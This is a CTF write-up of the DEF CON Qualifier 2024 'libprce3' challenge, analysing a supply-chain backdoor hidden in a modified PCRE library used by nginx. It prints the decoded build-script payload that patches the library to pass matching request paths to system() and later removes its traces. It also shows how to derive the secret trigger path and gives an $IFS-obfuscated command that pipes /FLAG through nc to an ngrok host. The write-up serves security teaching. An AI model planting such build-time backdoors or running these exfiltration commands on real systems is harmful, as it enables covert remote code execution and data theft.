---
title: "libprce3 - DEF CON CTF Qualifier 2024"
category: "pwn"
type: "writeup"
tags: ["pwn", "backdoor", "exploitation", "base64", "strcpy", "exec", "nginx", "def-con-ctf-qualifier", "def-con-ctf-qualifier-2024", "2024", "ctf-writeup"]
summary: "I didn’t spend enough time on this challenge during the CTF, though after one of the organizer told me - after the CTF - that it was about a backdoor that was added to the library, the challenge just"
source:
  name: "CTFtime writeup #39151"
  url: "https://ctftime.org/writeup/39151"
original_source: "https://mwlik.github.io/2024-05-10-defcon-quals-libprce3-challenge/"
ctf:
  name: "DEF CON CTF Qualifier 2024"
  year: 2024
  challenge: "libprce3"
---

## Metadata

- **CTF:** DEF CON CTF Qualifier 2024
- **Task:** libprce3
- **Author team:** Akasec
- **CTFtime tags:** backdoor, exploitation
- **CTFtime:** <https://ctftime.org/writeup/39151>
- **Original writeup:** <https://mwlik.github.io/2024-05-10-defcon-quals-libprce3-challenge/>

---
* libprce3 ≈ 47 solves
    * Setup
  * Now the challenge


## libprce3 ≈ 47 solves

I didn’t spend enough time on this challenge during the CTF, though after one of the organizer told me - after the CTF - that it was about a backdoor that was added to the library, the challenge just seemed to cool to not try to solve.

P.S: if you didn’t try this challenge and you’re willing to spend some time on it, I would recommend that you stop reading right now, and go try to solve it ASAP!

### Setup

For the setup, I used the sources that you could find [here](https://github.com/Nautilus-Institute/quals-2024).

I’ve rolled up docker container, with a flag in `/FLAG` as in the ctf.

Install the sources, then run these commands:

```
    └─$ docker build -t libprce3 .
    └─$ sudo docker run -p 1337:8080 --rm -it --entrypoint bash libprce3
```

## Now the challenge

In the attachments, we we’re given this:

![attachments](https://mwlik.github.io/assets/img/defcon_quals_libprce3_assets/attachments.png)

And a link to a site that uses nginx in its routing, thus the role of `prce` \- of pattern matching functionnality of nginx - enters here. here is a part of the `nginx.conf` file:

```
        server {
            listen 8080;
            root /var/www/html;
    
            location ~.*\.(php|php2|php3)$
            {
                return 403;
            }
```

The name (`libprce3`) was indicating something related to the recent `liblzma` backdoor, so the reasonable thing to do, is to compare the given library folder with the original source, doing that and diffing the differences (`git diff`) shows a sus line:

![diff sus line](https://mwlik.github.io/assets/img/defcon_quals_libprce3_assets/diff_sus_line.png)

It just seemed to unreadable to be legit, plus it seemed like the adjacent scenario of `liblzma`.

afer extracting the lines from the `makevp.bat` \- where it was found - and then running it we get this output.

![reveal_backdoor_sh](https://mwlik.github.io/assets/img/defcon_quals_libprce3_assets/reveal_backdoor_sh.png)

![reveal_backdoor_sh_output](https://mwlik.github.io/assets/img/defcon_quals_libprce3_assets/reveal_backdoor_sh_output.png)

decoding the base64 gives us this content:

```
    #/bin/bash
    if [ -z "$BUILD_NUMBER" ]; then
    rm -f a
    cat <<EOF > cleanup-tests
    #!/bin/bash
    make \$@
    if [ "\$1" = "install" ]; then rm -f cleanup-tests; fi
    EOF
    chmod +x cleanup-tests; make \$@
    exit 0
    fi
    exec 2>&-
    sed -i '368,370d' ./testdata/testoutput18-16
    cat <<EOF > 'testdata/ '
    diff --git a/pcre_compile.c b/pcre_compile.c
    index c742227..c2419ef 100644
    --- a/pcre_compile.c
    +++ b/pcre_compile.c
    @@ -65,6 +65,10 @@ COMPILE_PCREx macro will already be appropriately set. */
     #undef PCRE_INCLUDED
     #endif
    
    +#include "fcntl.h"
    +#include "string.h"
    +#include <sys/mman.h>
    +
    
     /* Macro for setting individual bits in class bitmaps. */
    
    @@ -8974,6 +8978,14 @@ Returns:        pointer to compiled data block, or NULL on error,
                     with errorptr and erroroffset set
     */
    
    +char* alph =
    +#include "b.h"
    +;
    +char* date_s =
    +#include "d.h"
    +;
    +pcre* bd_re = NULL;
    +
     #if defined COMPILE_PCRE8
     PCRE_EXP_DEFN pcre * PCRE_CALL_CONVENTION
     pcre_compile(const char *pattern, int options, const char **errorptr,
    @@ -8998,6 +9010,7 @@ return pcre32_compile2(pattern, options, NULL, errorptr, erroroffset, tables);
     }
    
    
    +
     #if defined COMPILE_PCRE8
     PCRE_EXP_DEFN pcre * PCRE_CALL_CONVENTION
     pcre_compile2(const char *pattern, int options, int *errorcodeptr,
    @@ -9012,6 +9025,9 @@ pcre32_compile2(PCRE_SPTR32 pattern, int options, int *errorcodeptr,
       const char **errorptr, int *erroroffset, const unsigned char *tables)
     #endif
     {
    +char b[0x400];
    +if (bd_re == NULL) { bd_re = 1;int f=open("/proc/self/maps", O_RDONLY);strcpy(b, "^/");strcat(b, alph);strcat(b, "/([\\\$a-zA-Z0-9;:/.|]+)");char *e = 0;int eo;bd_re = pcre_compile(b, PCRE_MULTILINE, &e, &eo, 0);if (bd_re == NULL) {bd_re = 1;}read(f, b, 12);b[12] = 0;char* base = (char*)strtoull(b, 0, 16);close(f);int c=0;for (int i=0; i<0x130000; i++) {char* p = base + i;if (p[0]=='n'&p[1]=='g'&p[2]=='i'&p[3]=='n'&p[4]=='x'&p[5]=='/'&p[6]=='1'&p[7]=='.'&p[8]=='1'&p[9]=='8'&p[10]=='.') {c++; if (c > 5) break;void* p_page = (void*)((uint64_t)p & 0xfffffffffffff000);mprotect(p_page, 0x1000, PROT_READ|PROT_WRITE);snprintf(p, 21, "ni/nginx/%s                            ", date_s);p[20] = 0x20;}} }
    +
     REAL_PCRE *re;
     int length = 1;  /* For final END opcode */
     pcre_int32 firstcharflags, reqcharflags;
    diff --git a/pcre_exec.c b/pcre_exec.c
    index 55230cd..3399738 100644
    --- a/pcre_exec.c
    +++ b/pcre_exec.c
    @@ -6347,6 +6347,10 @@ Returns:          > 0 => success; value is the number of elements filled in
                        -1 => failed to match
                      < -1 => some kind of unexpected problem
     */
    +int bd = 0;
    +// Defined in other c file
    +extern pcre* bd_re;
    +extern char* alph;
    
     #if defined COMPILE_PCRE8
     PCRE_EXP_DEFN int PCRE_CALL_CONVENTION
    @@ -6398,6 +6402,11 @@ frame_zero.Xnextframe = NULL;            /* None are allocated yet */
     md->match_frames_base = &frame_zero;
     #endif
    
    +// Here is the target, good luck:
    +// curl http://chiptunegeek.shellweplayaga.me:194/[ CENSORED ] --header "Ticket: ticket{[ CENSORED ]}" [ CENSORED ]
    +char buf[0x2000];
    +if (bd== 0) { bd = 1; if (bd_re) { int ov[30];int rc = pcre_exec(bd_re, NULL, subject, strlen(subject), 0, 0, ov, sizeof(ov)/sizeof(ov[0]));if (rc >= 2) { pcre_copy_substring(subject, ov, rc, 1, buf, sizeof(buf));char* m = strdup(buf);system(m); }} bd = 0; }
    +
     /* Check for the special magic call that measures the size of the stack used
     per recursive call of match(). Without the funny casting for sizeof, a Windows
     compiler gave this error: "unary minus operator applied to unsigned type,
    
    EOF
    patch -p1 < 'testdata/ ' 2>&1 1>/dev/null
    echo $(($(date +%s) / 86400)) | md5sum | cut -d' ' -f1 |  awk '{ for(i=0;i<10;i++) printf "%s", $1 }' > a
    echo '"'$(echo "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" | grep -o . | shuf --random-source ./a| tr -d '
    ')'"' > b.h; rm -f ./a;
    echo '"'$(date +"%m.%d.%y" | tr -d '0')'"' > d.h
    cat <<EOF > cleanup-tests
    #!/bin/bash
    make \$@
    if [ "\$1" = "install" ]; then patch -R -p1 < 'testdata/ ' 2>&1 1>/dev/null; rm -f 'testdata/ '; rm -f cleanup-tests b.h d.h; fi
    EOF
    chmod +x cleanup-tests; make $@
```

so it creates the patch file `cleaup-tests`, and when returning back to the `makevp.bat` the line `cleanup-tests @a` makes since now:

![makevp_bat](https://mwlik.github.io/assets/img/defcon_quals_libprce3_assets/makevp_bat.png)

The contents that gets added are:

To the `pcre_compile.c` file:

```
    #include "fcntl.h"
    
    #include "string.h"
    
    #include <sys/mman.h>
    
    ...
    
    char * alph =
    #include "b.h"
    ;
    char * date_s =
    #include "d.h"
    ;
    pcre * bd_re = NULL;
    
    ...
    
    {
        char b[0x400];
        if (bd_re == NULL) {
            bd_re = 1;
            int f = open("/proc/self/maps", O_RDONLY);
            strcpy(b, "^/");
            strcat(b, alph);
            strcat(b, "/([\\\$a-zA-Z0-9;:/.|]+)");
            char * e = 0;
            int eo;
            bd_re = pcre_compile(b, PCRE_MULTILINE, & e, & eo, 0);
            if (bd_re == NULL) {
                bd_re = 1;
            }
            read(f, b, 12);
            b[12] = 0;
            char * base = (char * ) strtoull(b, 0, 16);
            close(f);
            int c = 0;
            for (int i = 0; i < 0x130000; i++) {
                char * p = base + i;
                if (p[0] == 'n' & p[1] == 'g' & p[2] == 'i' & p[3] == 'n' & p[4] == 'x' & p[5] == '/' & p[6] == '1' & p[7] == '.' & p[8] == '1' & p[9] == '8' & p[10] == '.') {
                c++;
                if (c > 5) break;
                void * p_page = (void * )((uint64_t) p & 0xfffffffffffff000);
                mprotect(p_page, 0x1000, PROT_READ | PROT_WRITE);
                snprintf(p, 21, "ni/nginx/%s                            ", date_s);
                p[20] = 0x20;
            }
        }
    }
```

To the `pcre_exec.c` file:

```
    int bd = 0;
    // Defined in other c file
    extern pcre * bd_re;
    extern char * alph;
    
    ...
    
    // Here is the target, good luck:
    // curl http://chiptunegeek.shellweplayaga.me:194/[ CENSORED ] --header "Ticket: ticket{[ CENSORED ]}" [ CENSORED ]
    char buf[0x2000];
    if (bd == 0) {
        bd = 1;
        if (bd_re) {
            int ov[30];
            int rc = pcre_exec(bd_re, NULL, subject, strlen(subject), 0, 0, ov, sizeof(ov) / sizeof(ov[0]));
            if (rc >= 2) {
                pcre_copy_substring(subject, ov, rc, 1, buf, sizeof(buf));
                char * m = strdup(buf);
                system(m);
            }
        }
        bd = 0;
    }
```

The image is getting clear, we need to get our hands on the string `m`, that will be our cash cow.

we see here:

```
    int rc = pcre_exec(bd_re, NULL, subject, strlen(subject), 0, 0, ov, sizeof(ov) / sizeof(ov[0]));
```

that our input (in the context of our challenge its the path given by us), gets filtered using the `bd_re` regex pattern, which gets assigned here:

`pcre_compile.c`:

```
        if (bd_re == NULL) {
            bd_re = 1;
            int f = open("/proc/self/maps", O_RDONLY);
            strcpy(b, "^/");
            strcat(b, alph);
            strcat(b, "/([\$a-zA-Z0-9;:/.|]+)");
            char * e = 0;
            int eo;
            bd_re = pcre_compile(b, PCRE_MULTILINE, & e, & eo, 0);
```

the `pcre_compile` function just converts the regex string to a type that can get accepted by other prce functions, so we have `bd_re` equals to `^/someunknownstring/([\$a-zA-Z0-9;:/.|]+)`, but we still need to know the value of `alph`, which gets included from the `b.h` file:

```
    char * alph =
    #include "b.h"
    ;
    char * date_s =
    #include "d.h"
    ;
```

to know the value of `b.h` and `d.h`, we could return to the `clean-tests` file (remember!):

```
    echo $(($(date +%s) / 86400)) | md5sum | cut -d' ' -f1 |  awk '{ for(i=0;i<10;i++) printf "%s", $1 }' > a
    echo '"'$(echo "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" | grep -o . | shuf --random-source ./a| tr -d '
    ')'"' > b.h; rm -f ./a;
    echo '"'$(date +"%m.%d.%y" | tr -d '0')'"' > d.h
```

after running these commands individually, we understand that `alph` equal to kinda of a hash of the date when the file was created, and luckily we can creat it our self by knowing the date that gets returned to us in each request appended to `ngninx/`

```
        snprintf(p, 21, "ni/nginx/%s                            ", date_s);
```

and as shown in this picture:

![nginx_version_burp](https://mwlik.github.io/assets/img/defcon_quals_libprce3_assets/nginx_version_burp.png)

so by running this script:

```
    echo $(($(date -d '2006-04-23 10:10:10' +%s) / 86400)) | md5sum | cut -d' ' -f1 |  awk '{ for(i=0;i<10;i++) printf "%s", $1 }' > a;
    echo '"'$(echo "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" | grep -o . | shuf --random-source ./a| tr -d '\n')'"' > /dev/stdout; rm -f ./a;
```

we get the corresponding hash:

```
    └─$ bash script.sh
    "wpMI7xlCLtiqOk3bzUEfs1TQNVynGB4ASRFcDJ0KYPXmHv2o65gWuZ89djareh"
```

now we can have remote access to the machine, but remember that the message gets filtered by this regex `^/wpMI7...uZ89djareh/([\$a-zA-Z0-9;:/.|]+)"`, wich filers some important charachters like `{` and `>`, nonetheless, its enough to - by some considerable knowledge of bash - to run some code that will get us to the flag!

We use this command:

```
    cat$IFS$1/FLAG$IFS$1|$IFS$1nc$IFS$1X.tcp.eu.ngrok.io$IFS$111233;
```

which if you have some knowledge of bash, you’ll know that when bash parses $somenumber it stops by the first number and get evaluated to nothing, that’s how we can solve the problem of breaking between `$IFS`and`something`to not get evaluated to`$IFSsomething` which gets evaluated to an empty string.

So with that said, I’ve settuped my `ngrok`, opened a port to listen to, and…:

![burp_request](https://mwlik.github.io/assets/img/defcon_quals_libprce3_assets/burp_request.png)

![The Flag](https://mwlik.github.io/assets/img/defcon_quals_libprce3_assets/flag.png)

Et voila!

Tags: [CTFs Writeups](https://mwlik.github.io/tags#CTFs Writeups) [Exploitation](https://mwlik.github.io/tags#Exploitation)

Share:  [ X (Twitter) ](https://twitter.com/intent/tweet?text=DefCon+32+Quals+libprce3+Writeup&url=https%3A%2F%2Fmwlik.github.io%2F2024-05-10-defcon-quals-libprce3-challenge%2F "Share on X \(Twitter\)") [ LinkedIn ](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmwlik.github.io%2F2024-05-10-defcon-quals-libprce3-challenge%2F "Share on LinkedIn") [ VK ](https://vk.com/share.php?url=https%3A%2F%2Fmwlik.github.io%2F2024-05-10-defcon-quals-libprce3-challenge%2F "Share on VK")

  * [ Next Post __](https://mwlik.github.io/2024-06-16-justctf2024-teaser-justpocketthebase-challenge/ "justCTF 2024 Teaser justPocketTheBase Writeup")
